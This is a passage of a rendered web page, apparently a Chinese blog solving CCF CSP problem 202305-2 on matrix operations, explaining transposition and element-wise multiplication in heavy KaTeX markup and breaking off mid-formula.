class="hljs-string">&quot;%.3f %.3f\n&quot;</span>,xx,yy);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="202305-2-矩阵运算">202305-2 矩阵运算</h2><p>这道题需要了解矩阵的几个基本运算分别怎么计算的，以及矩阵的转置是什么。</p><p>首先说矩阵的转置，其实就是把一个nxm的矩阵转换成mxn的矩阵举个例子</p><p>左边原本是2x3的矩阵，转置后成了右边3x2的矩阵</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>⊺</mo></msup><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{cc}\begin{pmatrix}    1 &amp; 2 &amp; 3 \\    4 &amp; 5 &amp; 6 \\\end{pmatrix}^\intercal=\begin{pmatrix}    1 &amp; 4 \\    2 &amp; 5 \\    3 &amp; 6\end{pmatrix}\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:4.05em;"></span><span class="mord"><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.5043em;"><span style="top:-3.9029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin amsrm mtight">⊺</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.875em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="3.600em" viewBox="0 0 875 3600"><path d="M863,9c0,-2,-2,-5,-6,-9c0,0,-17,0,-17,0c-12.7,0,-19.3,0.3,-20,1c-5.3,5.3,-10.3,11,-15,17c-242.7,294.7,-395.3,682,-458,1162c-21.3,163.3,-33.3,349,-36,557 l0,84c0.2,6,0,26,0,60c2,159.3,10,310.7,24,454c53.3,528,210,949.7,470,1265c4.7,6,9.7,11.7,15,17c0.7,0.7,7,1,19,1c0,0,18,0,18,0c4,-4,6,-7,6,-9c0,-2.7,-3.3,-8.7,-10,-18c-135.3,-192.7,-235.5,-414.3,-300.5,-665c-65,-250.7,-102.5,-544.7,-112.5,-882c-2,-104,-3,-167,-3,-189l0,-92c0,-162.7,5.7,-314,17,-454c20.7,-272,63.7,-513,129,-723c65.3,-210,155.3,-396.3,270,-559c6.7,-9.3,10,-15.3,10,-18z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.875em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="3.600em" viewBox="0 0 875 3600"><path d="M76,0c-16.7,0,-25,3,-25,9c0,2,2,6.3,6,13c21.3,28.7,42.3,60.3,63,95c96.7,156.7,172.8,332.5,228.5,527.5c55.7,195,92.8,416.5,111.5,664.5c11.3,139.3,17,290.7,17,454c0,28,1.7,43,3.3,45l0,9c-3,4,-3.3,16.7,-3.3,38c0,162,-5.7,313.7,-17,455c-18.7,248,-55.8,469.3,-111.5,664c-55.7,194.7,-131.8,370.3,-228.5,527c-20.7,34.7,-41.7,66.3,-63,95c-2,3.3,-4,7,-6,11c0,7.3,5.7,11,17,11c0,0,11,0,11,0c9.3,0,14.3,-0.3,15,-1c5.3,-5.3,10.3,-11,15,-17c242.7,-294.7,395.3,-681.7,458,-1161c21.3,-164.7,33.3,-350.7,36,-558l0,-144c-2,-159.3,-10,-310.7,-24,-454c-53.3,-528,-210,-949.7,-470,-1265c-4.7,-6,-9.7,-11.7,-15,-17c-0.7,-0.7,-6.7,-1,-18,-1z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p>因此矩阵转置实际上就是调换一下n和m。那么矩阵的点乘又是什么呢？</p><p>首先矩阵的点乘需要矩阵的行列相等，其次运算时就是对应项相乘例如</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo>⊙</mo><mi>B</mi><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>13</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>a</mi><mn>23</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>⊙</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>13</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>b</mi><mn>23</mn></msub></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>11</mn></msub><mo>⋅</mo><msub><mi>b</mi><mn>11</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>12</mn></msub><mo>⋅</mo><msub><mi>b</mi><mn>12</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>13</mn></msub><mo>⋅</mo><msub><mi>b</mi><mn>13</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>21</mn></msub><mo>⋅</mo><msub><mi>b</mi><mn>21</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>22</mn></msub><mo>⋅</mo><msub><mi>b</mi><mn>22</mn></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>23</mn></msub><mo>⋅</mo><msub><mi>b</mi><mn>23</mn></msub></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">A \odot B = \begin{pmatrix}    a_{11} &amp; a_{12} &amp; a_{13} \\    a_{21} &amp; a_{22} &amp; a_{23} \\\end{pmatrix}\odot\begin{pmatrix}    b_{11} &amp; b_{12} &amp; b_{13} \\    b_{21} &amp; b_{22} &amp; b_{23} \\\end{pmatrix}=\begin{pmatrix}    a_{11} \cdot b_{11} &amp; a_{12} \cdot b_{12} &amp; a_{13} \cdot b_{13} \\    a_{21} \cdot b_{21} &amp; a_{22} \cdot b_{22} &amp; a_{23} \cdot b_{23} \\\end{pmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊙</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊙</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">23</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">13</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span 